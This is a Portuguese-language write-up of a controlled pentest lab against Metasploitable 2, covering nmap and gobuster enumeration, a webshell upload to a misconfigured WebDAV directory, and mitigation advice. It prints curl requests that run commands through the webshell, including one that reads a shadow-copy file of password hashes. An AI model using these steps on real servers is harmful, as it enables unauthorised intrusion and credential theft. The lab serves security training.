# 📘 DOCUMENTAÇÃO TÉCNICA  
## Credential Dump & WebShell Attack – Laboratório Controlado

---

## 📌 1. VISÃO GERAL

Este documento descreve tecnicamente o processo de exploração realizado em ambiente de laboratório controlado.

### 🖥️ Ambiente Utilizado

- **Máquina atacante:** Kali Linux  
- **Máquina alvo:** Metasploitable 2  
- **Virtualização:** VirtualBox  
- **Rede:** Host-Only (isolada)

### 🎯 Objetivo

Demonstrar, de forma prática e documentada, a exploração de vulnerabilidades relacionadas a:

- Serviço **WebDAV** mal configurado  
- Upload de **WebShell**  
- Execução Remota de Comandos (**RCE**)  
- Extração de credenciais  

---

## 📌 2. ESCOPO DO TESTE

### 🎯 Objetivo do Laboratório

Simular um cenário realista de ataque explorando falhas de configuração e serviços inseguros expostos.

### 📍 Escopo Autorizado

- IP alvo: `192.168.56.124`  
- Ambiente totalmente isolado  
- Uso exclusivamente educacional  

---

## 📌 3. METODOLOGIA UTILIZADA

A abordagem seguiu as etapas clássicas de um processo de Pentest:

1. 🔎 Reconhecimento  
2. 🔍 Enumeração  
3. 🛠️ Identificação de vulnerabilidades  
4. 💥 Exploração  
5. 🔐 Pós-exploração  
6. 📊 Análise de impacto  

---

## 📌 4. DETALHAMENTO TÉCNICO DAS ETAPAS

---

### 🔎 4.1 Verificação de Conectividade

Validação inicial da comunicação entre atacante e alvo.

#### 🛠️ Comando

```bash
ping 192.168.56.124
```

**Resultado:**  
Confirmação de conectividade ativa via ICMP.

---

### 🔍 4.2 Enumeração de Serviços

**Ferramenta:** Nmap  

#### 🛠️ Comando

```bash
nmap -sS -sV -p- 192.168.56.124
```

#### 📊 Serviços Identificados

- FTP  
- Telnet  
- SMTP  
- MySQL  
- HTTP (Apache 2.2.8)  
- Indícios de WebDAV habilitado  

⚠️ A presença de múltiplos serviços inseguros aumentou significativamente a superfície de ataque.

---

### 📂 4.3 Descoberta de Diretórios

**Ferramenta:** Gobuster  

#### 🛠️ Comando

```bash
gobuster dir -u http://192.168.56.124 -w /usr/share/wordlists/dirb/common.txt
```

#### 📁 Diretório Identificado

```
/dav
```

⚠️ O diretório apresentava permissões inadequadas.

---

### 💻 4.4 Exploração – Upload de WebShell

Foi realizado upload de WebShell no diretório `/dav`.

#### 🛠️ Validação de Execução Remota

```bash
curl "http://192.168.56.124/dav/shell.php?cmd=whoami"
```

#### ✅ Resultado

```
www-data
```

Confirmação de execução remota com privilégios do serviço web.

---

### 🔐 4.5 Pós-Exploração – Extração de Credenciais

#### 📁 Arquivo Identificado

```
/home/msfadmin/shadow_copy
```

#### 🛠️ Comando

```bash
curl "http://192.168.56.124/dav/shell.php?cmd=cat%20/home/msfadmin/shadow_copy"
```

#### 🚨 Impacto

- Exposição de hashes de senha  
- Possível escalonamento de privilégios  
- Potencial comprometimento total do sistema  

---

## 📌 5. ANÁLISE DE IMPACTO

A vulnerabilidade explorada permitiu:

- Upload não autenticado de arquivos  
- Execução remota de comandos  
- Leitura de arquivos sensíveis  
- Exposição de credenciais  

### 🏢 Possível Impacto em Ambiente Corporativo

- Comprometimento completo do servidor  
- Movimento lateral na rede  
- Exfiltração de dados  
- Interrupção de serviços  

---

## 📌 6. RECOMENDAÇÕES DE MITIGAÇÃO

Para evitar esse tipo de exploração, recomenda-se:

- 🔒 Desabilitar WebDAV se não for necessário  
- 🔐 Implementar autenticação forte  
- 📁 Aplicar controle de permissões adequado  
- 🔄 Atualizar serviços legados  
- 📊 Monitoramento contínuo de logs  
- 🛡️ Implementação de WAF  
- ⚖️ Aplicação do princípio do menor privilégio  

---

## 📌 7. CONCLUSÃO

O laboratório demonstrou, de forma prática, como falhas de configuração e serviços inseguros podem resultar em comprometimento completo de um servidor.

Reforça-se a importância de:

- Hardening de serviços  
- Gestão contínua de vulnerabilidades  
- Monitoramento ativo  
- Testes de segurança periódicos  

---

## ⚠️ AVISO LEGAL

Este laboratório foi executado exclusivamente em ambiente isolado e controlado, com finalidade educacional.
